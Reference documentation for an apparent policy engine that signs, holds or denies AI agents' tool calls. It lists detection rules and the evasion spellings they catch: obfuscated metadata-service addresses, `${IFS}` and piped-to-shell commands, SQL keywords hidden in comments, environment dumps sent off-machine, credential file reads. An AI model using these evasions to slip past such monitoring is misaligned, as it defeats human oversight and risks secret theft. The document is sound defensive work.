# Policy reference (v2 signer)

The v2 signer decides every tool call itself, over the raw arguments, with its own policy (`tracekit/policy2/`). The
agent can't change the policy or the tool's class: a class the adapter declares is a hint, and the class the policy
maps the tool to wins. The v1 daemon's regex engine is a different one ([migrating](migration.md#what-changes)).
Adding your own rules for the first time: [your own policy](policy-guide.md) walks one rule from a file to a running
signer.

```sh
tracekit policy lint my-policy.yaml       # every error at once
tracekit policy compile my-policy.yaml    # canonical JSON and its policy_hash
```

The signer loads `policy:` from `signer.yaml` (YAML or JSON), or `tracekit/policy2/packs/dev.yaml` by default, and
refuses to start on a lint error. `dev.yaml` is the laptop pack: the server deployments set `policy:` to the server
pack. The image links the installed packs at `/etc/tracekit/packs`; its example config runs
`/etc/tracekit/packs/server.yaml`, and the Helm charts and the compose stack mount a `/etc/tracekit/policy.yaml` that
says `extends: packs/server.yaml` (Helm value `signer.policy`; compose's `policy.yaml`). Replace that file with your
own policy; `extends` takes relative paths only, so a policy at `/etc/tracekit/policy.yaml` reaches the server pack as
`packs/server.yaml`.
YAML policies are always read by Tracekit's own YAML subset (`tracekit/yamlmini.py`), never PyYAML, so a
policy means the same on every signer: duplicate keys, anchors, aliases and merge keys are errors.

## Decisions

Each matching rule adds its id to the decision; the strictest section wins: **deny > ask > flag > allow**. `flag`
lets the call run and marks it; `ask` holds it for an [approval](approvals.md). The signed `policy.decision` carries
the verdict, every matching rule id, `policy_hash`, `engine` (`re2@<version>` or `regex@<version>`), a fresh
`decision_id` and the `args_commitment`. The `decide` RPC answers `allow` for a flagged call, with the flag rule's id
in `rule_ids`: its `decision` says what the client does (run, refuse or hold the call), and is `allow`, `deny` or
`ask` for every client since RPC version 15. A signer can't tell which version a client speaks, and an older client
would refuse a value it doesn't know, so the flag is in the signed record only.

Rule ids the signer adds itself:

| Id | Verdict | When |
|---|---|---|
| `TK-ARGS-INVALID` | deny | the raw arguments are not strict JSON ([format v2](format-v2.md#1-canonical-json)); the Python client sends parsed arguments a frame can't carry (a lone surrogate) as raw text, so they get this signed deny too |
| `TK-A2A-NAME` | deny | an `a2a` call (the A2A gateway or `run.transfer`) names a sender, receiver, projector, modality, weights hash, skill or part kind that is not printable ASCII without spaces. The signer refuses spelling a rule could miss; signed arguments retain the original spelling, while the response has a fixed reason and remedy that never repeats it. |
| `TK-OVERSIZE` | the rule's section | a rule's subject is over 64 KiB of UTF-8 and the rule matches none of its other subjects (a rule that matches one it can read gives its own id); it is never cut or windowed, and the rule's own section decides (a flag rule flags, a deny rule denies; a shell command over 64 KiB denies). A policy with `oversize: ask` (the laptop default, `dev.yaml`) holds it instead of denying where the call itself is over 64 KiB (its arguments as JSON): what the policy can't read waits for a person. A smaller call whose reading makes a subject that long (a variable expanded several times) or that names more than 64 URLs is denied there too. `oversize: deny` (or leaving the key out) keeps the rule's own section, so a pack that extends `dev.yaml` can set it to get the deny back. The decision's `reasons` (and the `decide` response's `reason`) name each such subject by its rule and field (`TK-S002's subject (the whole arguments)`) and say what to do: split the call into calls under 64 KiB (write a large file in parts), or, where it is held, have a person approve it |
| `TK-ENGINE-ERROR` | deny | the policy engine itself failed on the call's arguments (a bug): the call is denied and recorded, the decision's `reasons` (and the `decide` response's `reason`) name the error's type and the signer logs its traceback. Arguments nested too deeply to check are refused (`invalid_request`), not decided |
| `TK-SHELL-PARSE` | `on_parse_error` (ask) | a shell command can't be parsed, or what it runs can't be read from the line |
| `TK-HIDDEN-CODE` | deny | a held call (by a rule, a hold, a live constraint or a sum limit) whose approver's copy would hide more than clean values ([privacy](privacy.md#redaction-patterns), [limits](limits.md)). In a shell line the signer decides (a command argument, a typed call's `typed_line`, `process_manage` text), the policy's own parser says what is code and where in the line it stands: a hidden value holds a blank or a character the shell reads where it sits, is in a quoted word a program gets that isn't known to read it as data (`sqlite3`, `osascript`, psql's `-c`; data: a data reader's words (by its bare name, given no option that runs a program), terraform's `-var`, helm's `--set`, kubectl's `--from-literal`, a database client's connection, where the words before place them, a value given a data name such as `DATABASE_URL`; quoted or not, never a runner option's value such as tar's `--to-command`, a value given another name before a program, or what a line that runs a script file writes), names or sits in a program or a script the line runs, starts a word of its own (`password: x`) but in data, or sits in an interpreter's program; or the parser can't read every command on the line (`${IFS}`, `echo … \| sh`), or reads code it can't place in the line (an alias's value, a git alias's, a script the line writes and then runs, a variable's value run). TK-S012's code arguments (`code`, `source`, `input` …) are an interpreter's program and its `args` or `argv` an argv. In any other argument or key, its hiding takes a character that makes code (`;`, `&`, a pipe, `<`, `>`, `(`, `)`, `$`, a backquote, a line end) or it starts a word of its own. No person could see what they would approve, so the call is never asked: it is denied in every pack, recorded with this id after the hold's, and this is the only reason it gives: rewrite the command without inline secrets, read from the environment or a file the command names. v1's hook and SDK deny such a hold the same way, and one whose approval summary would pass 64 KiB (its approver would get it cut) |
| `TK-SQL-PARSE` | ask | no SQL dialect can read the statement (an unclosed literal or comment), or it is not text |
| `TK-SOURCE-PARSE` | `on_parse_error` (ask) | a Browser Use 1.x `python` cell or `finish_from_repl` delivery steps outside the subset of Python the reader follows: binding a builtin, a harness name or a name an import binds (a parameter or comprehension target binds in its own scope and is exempt); a dunder name or attribute (a plain class's own dunder methods are exempt), `builtins`, `__builtins__`; `:=`; `exec`, `eval`, `compile`, `breakpoint`, `help`, `input`, `exit` or `quit` anywhere; an import of anything but `json`, `re`, `math`, `cmath`, `time`, `datetime`, `itertools`, `collections`, `string`, `textwrap`, `unicodedata`, `decimal`, `os`, `os.path`, `browser_harness` and `browser_harness.helpers`, or one outside a function that binds a command or helper under the cell's own name; a call into such a module beyond its own public functions and classes one level down, or inside a function body; a decorator that is a function, lambda or class the cell defines, and a call through a function decorated by anything but `property`, `classmethod` or `staticmethod`; a class with a base, keyword, decorator, type parameter or a body of anything but `def`s; a store into anything but plain data the cell built, or an attribute store; a helper, builtin or module function used as anything but a direct call, or a value the reader can't follow handed to what calls it or named again; a method of anything but plain data the cell built, through that type's own methods; a call or attribute through a name the cell didn't bind (an earlier cell's); `open` to write, `print(file=...)`, `globals`/`locals`/`vars`, `setattr`/`delattr`, `__import__`, a computed `getattr`; a callee or required argument that isn't literal text, an unknown bare callee (raw CDP and `_`-prefixed helpers included), a non-literal argv, over 256 calls, or over 64 KiB. A function or lambda body is read where it is defined, and a literal argv list is decided as the shell command it runs |
| `TK-UNKNOWN-TOOL` | `unknown_tools` | the tool maps to no class and `unknown_tools` is `flag`, `ask` or `deny` (map an application's own tools to `app`) |

These, and the ids of holds, quarantines, live constraints and approvals (`TK-HOLD`, `TK-QUARANTINE`,
`TK-CONSTRAINT`, `TK-LIMIT-SUM`, `TK-APPROVED`, `TK-APPROVAL-*`) and `TK-HIDDEN-CODE`, are the signer's own: lint refuses a rule with one.

Each `decide` gets a new `decision_id`, consumed once by `complete` with the same arguments; `complete` with other
arguments is refused. Only deny and ask are remembered per `(tool_call_id, attempt)`. An allow after a deny for the
same arguments in a run is a signed `capture.gap{decision_flip}`; a class hint that disagrees with the policy is a
`capture.gap{class_mismatch}` and the stricter of the two decisions applies.

## File format

```yaml
version: '2026.10-v2-1'
description: what this policy is for
extends: coding.yaml            # optional: a relative path, or a list of them; the compiled policy names parents by hash
unknown_tools: ask              # allow (default), flag, ask or deny
on_parse_error: ask             # ask (default) or deny: TK-SHELL-PARSE's and TK-SOURCE-PARSE's verdict; a shell command
                                # or a 1.x cell source the reader can't read
oversize: ask                   # deny (default) or ask: TK-OVERSIZE's verdict where a deny rule can't read a call
                                # over 64 KiB (dev.yaml asks; a policy that extends it sets deny to deny again)
tools:                          # tool name or glob (fnmatch) -> class
  Bash: shell
  'mcp__*': mcp
  transfer_funds: payment
  search_flights: app           # an application's own tool: known (unknown_tools leaves it alone), no class fields
untrusted: [http, mcp, WebFetch]   # tool classes and tool name globs whose results are untrusted content (Provenance)
handoffs: [transfer_to_refunds_agent]   # tool names the framework runs as handoffs to another agent (OpenAI Agents'
                                        # transfer_to_*, LangGraph routing schemas such as CompleteOrEscalate); no
                                        # pack names any: exact names, as your agents' handoff tools are called
structured_output: ['browser_use:*']    # tool names the model asks for in its structured output, not as tool calls:
                                        # reconciliation doesn't compare them with tool uses (browser.yaml names these)
explains:                       # hosts a tool's own dependencies reach, for the egress observer (docs/egress.md#explains)
  - {label: package-install, hosts: [pypi.org, '*.pythonhosted.org']}   # a rule label, or a tool glob: {tool: ...}
deny:  [<rule>, ...]
ask:   [<rule>, ...]
flag:  [<rule>, ...]
sequences: [<sequence>, ...]    # detection (below): steps across calls
limits:    [<limit>, ...]       # detection: counts and sums in a window
respond:   [<respond>, ...]     # detection: what each trigger does (shadow, or enforced: docs/incidents.md)
approval_agent:                 # the AI approver (below): off unless set
  mode: shadow                  # or enforce
  rules: [TK-SHELL-PARSE, TK-A062, TK-A025]
  run: {clean: [untrusted_content, secrets_access]}
```

`extends` merges the parent's `tools` under the child's, joins every `untrusted`, `handoffs`, `structured_output` and
`explains` list (a child can't remove a name its parent declares), keeps the parent's other top-level keys unless the
child sets them, and keeps the parent's rules except those whose id the child redefines. A list of parents is merged in
order (a later parent's top-level keys and tools win; the same rule id in two parents is a duplicate-id error, unless
both carry the identical rule, which is kept once). `sequences`, `limits` and `respond` merge the same way, by id
(`respond` by trigger): a deployment that adds a sequence keeps the pack's. The compiled `extends` is the list of their
hashes. An absolute path, `~` or a loop is an error.

**Rule fields:**

| Field | Required | Meaning |
|---|---|---|
| `id` | yes | unique across the policy |
| `pattern` | yes | RE2-subset regex, searched for in the subject (unanchored unless it uses `^`/`$`) |
| `class` | no | the rule applies only to tools of this class; without it, to every tool |
| `tool` | no | regex that must match the whole tool name |
| `field` | no | which subject to match (below) |
| `unless` | no | regex; a subject that matches it is exempt |
| `unless_cli` | no | a shell rule's exemptions read by a CLI's grammar, not its text: [CLI grammars](#cli-grammars) |
| `reason`, `rationale`, `label` | no | text; `reason` is shown with the decision, `label` names a flag's category (sequences and limits match labels) |
| `remedy` | no | on a `deny` or `ask` rule: what to do instead, one sentence (below) |
| `from` | no | `untrusted`: the rule also needs a value of its subject that only untrusted content brought into the run (Provenance) |
| `when` | no | on an `ask` or `flag` rule: `{run_has: [label, ...]}`, a run condition: the rule applies only once the run carries every label it names ([run conditions](#run-conditions)) |
| `mode` | no | on an `ask` rule with `when`: `shadow` records the calls it would hold, as a flag, and holds none; `enforce` (the default) holds them |
| `approval` | no | on an `ask` rule only: `executor: t1` (default) or `t2` ([approvals](approvals.md#tiers-t1-and-t2-executors)), and/or `passkey: required` ([approvals](approvals.md#web-approvals-and-passkeys)), and/or `agent` (below) |

A `remedy` says what the agent does instead and what a person can do (approve the held call, allow it in their own
policy, give the agent a sandbox): `Push without --force, --mirror or a + refspec (rebase onto the remote branch, or
push a new branch); a person rewrites shared history themselves.` The `decide` response's `reason` for a deny or an
ask is the matching rules' reasons joined by `; `, then each remedy once, so the client shows it to the model and
`tracekit view` shows it under the rule in the decision's detail. The signed record names only the rule ids, and the
policy (by its `policy_hash`) holds the text. Lint keeps a remedy to one line of at most 200 characters, starting with
a capital letter and ending with a period, in the present tense (no `should`, `would`, `could`, `might`, `please`,
`maybe`, `perhaps`, `consider` or `try to`), and refuses one on a flag rule: a flagged call runs. The deny and ask rules
of `coding.yaml`, and those `server.yaml` and `strict.yaml` add themselves, carry one; the browser, data, network,
cloud and communication packs' rules don't yet, so their calls get the reason alone.

`on_parse_error: deny` denies (rather than holds) a shell command the parser can't read or whose program it can't see
(`TK-SHELL-PARSE`: an unclosed quote, a command name from a variable, a script piped into a shell). Use it where no
person answers holds; expect more denials of ordinary commands that build a name at run time. It decides only
`TK-SHELL-PARSE`; `TK-SQL-PARSE` always asks.

`oversize: ask` holds for a person a call over 64 KiB that a rule can't read (`TK-OVERSIZE`) instead of denying it; the
laptop default, `dev.yaml`, sets it. `oversize: deny` (or leaving the key out) keeps the rule's own section: a flag
rule flags, a deny rule denies, and a shell command over 64 KiB denies, as on `server.yaml` and `strict.yaml`. A pack
inherits `oversize` through `extends`, and a child's value overrides its parent's, so a pack built on `dev.yaml` can
set `oversize: deny` to get the deny back. Any other value is a lint error.

Lint also rejects unknown keys, a `field` the rule's class doesn't have, and a class rule no tool maps to ("can never
fire"). It warns (`tracekit policy lint`, which loads the policy all the same) on a tool mapped to `unknown`: that is
what an unmapped tool already is, so `unknown_tools` still decides it. Map an application's own tools to `app`.

### Agent approvers (`approval.agent`)

`approval: {agent: {mode, allow: {fields}, budget?, veto_s?}}` lets an agent approver answer the rule's held calls
within bounds ([approvals](approvals.md#agent-approvers)). It is part of the policy, so of `policy_hash`.

| Key | Meaning |
|---|---|
| `mode` | `enforce`, or `shadow`: answers are recorded as `approval.suggested` and change nothing |
| `allow.fields` | argument name → `{type: integer\|string\|boolean, min?, max?, enum?, pattern?}`; `min`/`max` on integers, `pattern` (RE2 subset, whole value) on strings, `enum` values of the field's type. A closed world: every argument must be named, every named one present |
| `budget` | `{count?, sum?: {field, max}, window, scope: tenant\|requester}`: at most `count` agent approvals, and `sum` of an integer field with `min` >= 0, in `window` seconds (at most 30 days) |
| `veto_s` | an agent's approval runs only after this many seconds, so people may revoke it first |

Lint errors: `approval.agent` with `passkey: required`, or on a `from: untrusted` rule (people answer those). A warning
(`tracekit policy lint`): `approval.agent` on a `payment` rule without `executor: t2`, where the approval binds the
arguments the agent reported rather than what runs. The signer refuses to start with a policy that has agent rules
and no `approvals.agents`.

### The AI approver (`approval_agent`)

`approval_agent: {mode, rules, run: {clean}, veto_s?}` lets a reviewer model answer the holds of the rules it lists,
each only like a call a person approved before ([approvals](approvals.md#the-ai-approver)). It is part of the policy, so
of `policy_hash`, and a policy that `extends` the laptop default sets it.

| Key | Meaning |
|---|---|
| `mode` | `enforce`, or `shadow`: answers are recorded as `approval.suggested` and change nothing |
| `rules` | rule ids from the reviewed list: `TK-SHELL-PARSE`, `TK-A062`, `TK-A025` |
| `run.clean` | `untrusted_content`, `secrets_access`: while the run carries one (read across all of its requester's runs), people answer every hold |
| `veto_s` | an AI approval runs only after this many seconds, so people may revoke it first |

Lint errors: a rule not on the reviewed list, and by name a deny rule, a `from: untrusted` rule, a credential or secret
read, a payment rule, Tracekit's own guardrails (field `tracekit`), a push (field `push`, `TK-A033`, `TK-A056`), a
passkey rule, a rule with its own `approval.agent`, `TK-SHELL-PARSE` under `on_parse_error: deny`, and a `run.clean`
that is empty or names another label. A warning (`tracekit policy lint`): a `run.clean` that leaves a label out.

### Intent grants (`approval.grant`)

`approval: {grant: payment.send}` lets a person's [intent grant](intent-grants.md) release the rule's held calls within
the grant's limits; anything else the rule holds stays held. A call held by several rules is released only when each
of them (flags aside) opts in. Lint error: `approval.grant` with `passkey: required`. `TK-GRANT` is the signer's id for
a call a grant released, so no rule may use it. The shipped packs opt in `TK-A044` (coding) and `TK-M001` and
`TK-M002` (server).

`policy_hash` is `sha256:` of the compiled policy as sorted-key, compact JSON (`policy2.compile.canonical`).

## Classes and fields

An MCP tool named as Claude Code and the Claude Agent SDK name it (`mcp__<server>__<tool>`, split at the first `__`) is
also checked as `mcp:<server>/<tool>`, so the server packs' `mcp:` mappings and rules reach it. An MCP tool
(`mcp:<server>/<tool>`) is also checked under its bare name `<tool>`, and as each name `tools:` lists that the bare name
spells (below), in that name's own class if `tools:` maps it, else the MCP call's; the stricter decision applies, with
every reading's rule ids. A rule on an app tool's name holds when the same call is labelled an MCP one.

A name `tools:` doesn't list, exactly or by a glob, that spells one it does (compared as CrewAI rewrites names: accents
dropped, case, spaces and punctuation ignored) is also checked as that tool, and its results are untrusted when that
tool's are; when two listed names share the spelling (the server pack lists the Anthropic tool `bash` and Claude Code's
`Bash`), it is checked as each. The stricter decision applies, with every reading's rule ids, and the record keeps the
name as sent. Frameworks rewrite the names they are given: CrewAI's hooks see `bash` for a tool declared `Bash` and
`multi_edit` for `MultiEdit`.

The signer maps the tool to a class (`tools`: exact name first, then the most specific matching glob, the one with
the most characters other than `*` and `?`, so `mcp:postgres/*` wins over `mcp:*/*`; else `unknown`) and extracts the
class's fields from the raw arguments (`policy2/classes.py`):

| Class | Fields | Taken from |
|---|---|---|
| `shell` | `command`, `argv`, `line`, `code`, `effects`, `package_index`, `container_host_access`, `push`, `publish`, `requests`, `harness_launch`, `environment`, `gh_runs` | `command`, `cmd` or `commands` (one of them: a string, or a list of strings; a `commands` list is read joined by newlines and each entry on its own); `code` is the command and its normalised lines without the text a command only writes into a file (below); `effects` is each file the commands write or delete (below); `package_index` is each explicitly selected package source (an index or registry option, `-f`/`--find-links`, or a variable such as `PIP_INDEX_URL` or `npm_config_registry` before a command or through `env` or `export`), with default PyPI/npm registries omitted; `container_host_access` detects host-access options of a `docker`/`podman run` (those before the image; later words are the container's command); `harness_launch` is `LAUNCH:<harness> <why>` for each agent harness's CLI the line starts with settings it chooses (a home or settings variable it sets, `env -i` or `-u`, a settings option); `environment` is `SENT:<printer> <sender>` for each command that prints the whole environment into one that sends it off the machine (a later pipeline stage, its words, herestring or heredoc, a block, subshell or `>( )` it sits in, a file the line writes it into); `gh_runs` is `GH: <words>` for each `gh` alias set or used, extension installed or run, and editor, pager or browser set |
| `fs` | `path`, `op`, `content_digest`, `ci_workflow`, `agent_skill`, `git_config` | `file_path`, `notebook_path`, `path`; op from the tool (Write, Edit, Read…) or `op`; `ci_workflow`: a CI workflow's new text; `agent_skill`: an agent skill file's text; `git_config`: the text written into a file a Git config may include, as git reads its sections (`TK-F049`) |
| `http` | `method`, `url`, `host`, `internal`, `sends_to`, `link` | `url`, `method` (default GET); `host` and `internal` as below; `sends_to`: the host, when the method is not GET or HEAD, there is a `body`, `data`, `json`, `files`, `form` or `content`, or there is a query (in the URL or a non-empty `params`); `link`: the URL, when its query is all the call sends (a `from: untrusted` rule on `sends_to` doesn't match when untrusted content gave that URL exactly as it stands: the agent follows a link and adds nothing to it) |
| `sql` | `statement`, `code`, `verb`, `db` | `sql`, `query` or `statement`; `db` or `database`; `code` as below, `verb` its first word |
| `payment` | `amount`, `currency`, `payee`, `new_payee`, `payees` | `amount`/`amount_cents`, `currency`, `payee`/`to`/`recipient` (`new_payee` is not extracted yet); `payees`: every one of `payee`, `to`, `recipient`, `destination`, `account`, `account_number`, `iban` |
| `email` | `to`, `domains`, `attachments`, `recipients` | `to` (string or list), `attachments`; `recipients`: every one of `to`, `cc`, `bcc`, `recipients` |
| `mcp` | `server`, `tool`, `args` | the tool name (`mcp__server__tool` or `mcp:server/tool`) and the arguments |
| `browser` | `action`, `url`, `scheme`, `host`, `internal`, `sends_to` | `action`, `url`; `scheme`, `host` and `internal` as below; `sends_to`: the host of `page_url` for `input` and `upload_file`, and the URL's host for a `navigate` or `go_to_url` whose URL has a query string |
| `a2a` | `sender`, `receiver`, `route`, `skills`, `kinds`, `hosts`, `size`, `modality`, `projector`, `weights` | A2A gateway arguments, or `run.transfer`; names are lower-cased for this class and unprintable names are refused as `TK-A2A-NAME`. |
| `app` | — | — (an application's own tool: known, so `unknown_tools` doesn't apply; rules reach it by `tool` name, `field: target` or a raw argument `field`) |
| `unknown` | — | — |
| `harness` | — | — (a coding agent's message to its own agents: a subagent's prompt, a message to a teammate or a subagent, a subagent's report, a todo list; every rule of no class reads it, but its `target` is only the URLs and network addresses it names, below) |

Every class also has `target`: what the call acts on rather than what it carries (below); a `harness` call's is only
the URLs (each also canonical) and bare network addresses in it (its words split at spaces and punctuation, a bare
IPv4 address also as its canonical host), so `TK-S004` and `TK-F005`, which read a target for file names, don't read
a prompt that names `~/.aws/credentials` as a file it opens, while `TK-S002` (a secret's value, in the whole call) and
`TK-S001` (the metadata service's address) still read it. A shell `push` is each command's
argv, as `argv` reads it, but a git push (`git push` after git's own options, `git -C dir push`; `git send-pack`;
`hub push`) is what makes it need a person, one `PUSH:<why> <word>` each: `default` (main or master, `refs/heads/` or
`heads/` too), `unknown` (no refspec, `HEAD`, `@`, `origin/HEAD`, an expansion or a pattern, an option push doesn't
take or an ambiguous prefix, a `-c` or `--config-env` remote push or mirror setting), `tags` (`--tags`, `--follow-tags`, a `refs/tags/` or `tags/` refspec, `tag <name>`)
and `all` (`--all`, `--mirror`, the `:` refspec); a push of named branches other than main and master gives none. A
`gh` or `hub api` call is also read percent-decoded, as GitHub reads its path, and gives `PUSH:contents` when it puts
or deletes a file through the contents API (`repos/<owner>/<repo>/contents/…` or `repositories/<id>/contents/…`,
as a path or in a URL) on the default branch or one the line can't tell: no `branch` field, main or master, a value gh
reads from a file (`-F branch=@b.txt`) or an expansion gives, `HEAD`, or any `--input`, whose body then names the branch. Its
words are read as gh reads them (an option that takes a value takes the rest of its word or the next word, so `-f
--method=GET` is a field; `-F` fills gh's `{branch}` placeholder, `-f` doesn't). A write whose target the line can't
tell gives `PUSH:unknown`. An expansion (`$X`, `${…}`, `$(…)`, a backquoted span), `{branch}`, a `{}` that `find
-exec`, `parallel` or `xargs -I{}` fills in, or the word `xargs -I` replaces may stand for any number of path segments,
so one at or before the route's place leaves the route to the first literal segment after it that names one (`issues`,
`pulls`, `actions`, `code-scanning` and the like, or `git`, `contents`, `merges`, `merge-upstream`), and is unknown
without one. A PUT or DELETE with one before its route is unknown whatever follows when its body is the contents API's
(`message` and `content`, or `message` and `sha`, or a body the line can't read) and no literal `branch` field names
another branch: that API takes every segment after `contents/` as the file's path. Unknown too: a write with no
endpoint (`xargs` appends it), one whose endpoint is one segment that isn't one of GitHub's (`graphql`, `user`,
`markdown`, `notifications` and the like) or whose owner's, repo's or route's place holds a word GitHub can't route
(`%` from BSD `xargs -J`, `,,` from `parallel -I`), an expansion or `{branch}` after `git/` (where it names the ref),
and a `.` or `..` segment. A write to `merges` gives `PUSH:merges`, a fork's `merge-upstream` into main or master (in
any case, or a branch the line can't tell) `PUSH:merge-upstream`, and `gh repo sync <owner/repo>` into the same
`PUSH:repo-sync` (`refs/heads/main` and `HEAD` too; with no repository it updates the local one, a pull, not held,
unless `xargs`, `parallel`, `find -exec` or `fd -x` runs it and may give it one). The path is read from a `repos/` or
`repositories/` segment past its start only where an owner and a repository (an id) follow it, so creating a
repository (`user/repos`, `orgs/o/repos`) is a route of its own. A remote's push mapping given through git's config environment (`GIT_CONFIG_KEY_<n>`,
`GIT_CONFIG_VALUE_<n>`) is read as its `-c` pair. The shell field `publish` is `push` for only the commands whose
program one of its readers takes (git, hub, gh, docker, podman, kubectl, the REST clients, the publishing and
deploying CLIs, and `xargs` and `parallel`, whose `-I` word they read), and the push settings a line writes or moves:
the part `TK-F030` reads, so a call of other programs reads no push field. The shell field `requests` is each
request a curl command makes, `<METHOD> <url>`, as curl's grammar reads the command: each URL (a positional, `--url`,
`--expand-url`; curl's globs expanded, `refund[s-s]`, `{refunds}`, unless `-g`; dot segments removed unless
`--path-as-is`; the host percent-decoded and in lower case, without a user, a port or a trailing dot; runs of `/` as
one; a percent-encoded unreserved character decoded; `--request-target`'s path in place of the URL's, `*` for one the
line can't tell) with the method curl sends: the last `-X` or `--request` (or
`--expand-request`), else PUT with `-T`, else POST with a body (`-d`, `--data*`, `--json`, `-F`, `--form*`, each as
`--expand-*` too) unless `-G` sends it as a query with `-q` first (no config file read) and no form or JSON, else HEAD
with `-I`, else GET; `*` for a method or URL the line can't tell (an expansion, `--next`, `-K`, a `{{variable}}`, more
than 256 URLs from one word's globs) and for each word of a curl the grammar can't read (`* *` too where it names
`--request-target`); `* *` too for a method other than GET or HEAD that follows a redirect with credentials
(`--location-trusted`, or `-L` with `-n`, `--netrc-optional` or `--netrc-file`, whose credentials curl sends to the
host it lands on), which sends it on to wherever the redirect points. `TK-A095` reads it.

The shell field `effects` is each file the commands write, as `WRITE_TARGET:path`, or delete, as `DELETE_TARGET:path`,
each also with the path casefolded (the shell's append to `.ssh/known_hosts`, `>>` or `tee -a`, a Windows spelling too,
is `APPEND_TARGET:path`, which no shipped rule reads): what a redirection writes, and the files `rm`, `unlink`, `shred`,
`truncate`, `tee`, `cp`, `mv`, `install`, `ln`, `dd of=`, `sed -i` and `perl -i` name (`mv` deletes its sources; `cp`,
`mv`, `install` and `ln` into a directory, `-t`'s or one that ends in `/`, also write each source's name there), also
when `git`, `docker`, `podman`, `kubectl` or `parallel` runs one from its own words (`git rm`, `docker exec c rm`); what
awk's `print > "file"` writes; the files `yq -i`, `sd`, `dos2unix`, a decompressor (each without its suffix, or its
`-o`; lz4's on a `.lz4` too), `ditto`, `git config -f`, `base64 -o`, `uudecode -o`, `emacs`, `split` and `csplit` (their
prefix, as a pattern) write; the members `tar -x` (`bsdtar`, `gtar`), `unzip` and `7z x` name in their folder, or that
folder (`DIR/`) when they name none; the literal path an interpreter's inline code writes (an `open` in a writing mode,
`writeFileSync`, `File.write`, `file_put_contents`, a copy's or rename's target), read as `tee` of it; each file a
download writes, read by all of `curl`'s or
`wget`'s options (curl's `-o` in any cluster, `-so`, each URL's name with `-O` or `--remote-name-all` in its
`--output-dir`, its header, cookie, trace, error and cache files; wget's `-O`, each URL's name in its `-P` folder,
its log and cookie files; wget's options by any unique prefix), a download whose file the line can't name (a variable
it gives no value, a substitution, a pattern, curl's `#1` or `{{name}}`, a config file, a URL list, a name the server
picks, a recursive fetch, an option the reader doesn't know) held as unread (`TK-SHELL-PARSE`); and for a `find`, what
its `-exec` commands write and, when it
has `-delete` or an `-exec` that deletes or writes each file it finds (`-exec rm`, `-exec sed -i … {}`), its start
paths (also after `--`), the paths its `-path`, `-ipath`, `-wholename`, `-iwholename`, `-regex`, `-iregex` and
`-files0-from` name, and the log or history names among its tests. In a call with a writer that gets its files at run
time or inside code it runs (an `rm`, `unlink`, `shred`, `truncate`, `tee`, `cp`, `mv`, `install` or `ln` with a `$`
or backtick operand, `rm "$f"`, but not `sed -i`, `perl -i` or `dd of=`; or `xargs`, `parallel`, `docker`, `podman`,
`kubectl`, `ssh` or an interpreter such as `perl -e` or `python -c` whose words hold `rm`, `unlink`, `truncate`,
`shred`, `mv`, `tee`, `dd`, `ln`, `sed`, `perl`, `find` or `>`), each argument of every command in the call (on any of
its lines) is also a `MAY_WRITE:word` subject, which only `TK-D008` reads, and so is the link `ln`, `cp -s` or
`cp -l` makes (a later write through it writes the file it points at). A rule on `effects` can tell a destination from
a file a command only reads or copies. The tags are not in `target`, so a target rule reads the same subjects as before `effects` existed.

- `tracekit` (shell): what a command does to Tracekit's own files and signer, each a tagged subject (`TK-D007`).
  `ACT:` what a command acts on or runs: its words (data words aside) and stdin, the files redirections write, the
  files `effects` names, assignments and heredoc programs. The other tags are allowlists, one subject per word.
  `LIST:` what `ls`, `stat`, `test` or `find` (without an action, `-fprint`, `-fls` or `-files0-from`) names, and an
  assignment the line uses only in readers (not to `CDPATH`, `HOME`, `OLDPWD` or another variable the shell reads on
  its own; none on a line that may set or export variables). `READ:` what `cat`, `head`, `tail`, `grep`,
  `sed -n` (a script that only prints; not `-i`, `-I`, `-f` or another option but `-n`, `-e`, `-E`, `-r`, `-s`, `-u`
  and `-z`) or `jq` names, printing to the terminal or a filter, and the files a
  redirection reads. `DEEP:` what such a reader reads all of (`grep -r`, a pattern) or names when its output goes to
  a file, a substitution or anything but a filter (`find … | xargs cat`, `cat $(find …)`, a `while read` loop), and the
  folder a `cd` enters where every command only reads or lists. Any other program's words are `ACT:`.
  `SIGNER_MODULE:` an `ACT:` text whose code reaches more of `tracekit.signer` than `rpc_schema`'s tables,
  `reconcile.compared` and `model_names`, and the service's `load_policy` and `DEFAULT_POLICY`, by those names; `RPCError` only caught or tested for with `isinstance`. A
  tagged subject's tag doesn't count toward its size.

- `host`: the URL's host as a browser reads it (`host:port/path` without a scheme is http; controls, tabs and newlines dropped, `view-source:` and `blob:`
  peeled, `\` as `/`, any number of slashes after the scheme, the host after the last `@`), percent-decoded, NFKC
  (fullwidth letters and digits), casefolded, without port or trailing path; an IP address in its canonical form
  (`169.16689662`, `0xa9.0xfe.0xa9.0xfe` and `[::ffff:a9fe:a9fe]` are all `169.254.169.254`).
- `internal`: `true` when the host is a loopback, private, link-local, shared (CGNAT), reserved, multicast or
  unspecified address in any notation (also the IPv4 address inside a mapped, compatible, 6to4 or NAT64 IPv6 address),
  looks like an address but is none (`1.2.3.4.5`), or when a browser and Python's urllib read different hosts from the
  URL (`http://a\@b/`); else `false`.
- `scheme`: the URL's scheme as a browser reads it (`view-source:file:` and `fi<TAB>le:` are `file`).
- `code`: the statement with comments blanked and every literal and quoted identifier (`'…'`, `E'…'`,
  `$tag$…$tag$`, `"…"`, `` `…` ``, `[…]`) replaced by `''` or `""`, once for each way PostgreSQL, MySQL, SQLite and
  SQL Server split it (backslash escapes, `#` comments, nested `/* */` and `--` differ), and as PostgreSQL with
  `standard_conforming_strings` off and MySQL with `NO_BACKSLASH_ESCAPES` read it (a session or server setting
  changes how a backslash in a literal reads), so a keyword hidden in one dialect's comment or literal but run by
  another is still seen. A dialect that can't close a literal or comment is read up to its last `;` before it (MySQL
  and SQLite run a statement at a time, so those run); a statement no dialect can read is `TK-SQL-PARSE`.

## What a rule matches (the subject)

| Rule | Subject |
|---|---|
| `class: shell`, no `field` or `field: argv` | each simple command the line runs, as its argv joined by spaces, argv[0] a basename casefolded (the agent's file system may ignore case: macOS runs `/bin/sh` for `ſh`); and again with a space inside a word as `\x7f` where a word before the last has one (so `git -C 'my dir' push` reads `-C`'s value as one word to `[^ ]*`; the last word's spaces move no word after it), and with a word that is only a variable the line gives no value there as `$\x7f` (`TK-D012` reads it as an action it can't read) |
| `class: shell`, `field: command` | the raw command line |
| `class: shell`, `field: line` | the raw command line and each line the parser normalised (quotes and escapes resolved, redirections kept), as typed and again with its program names casefolded |
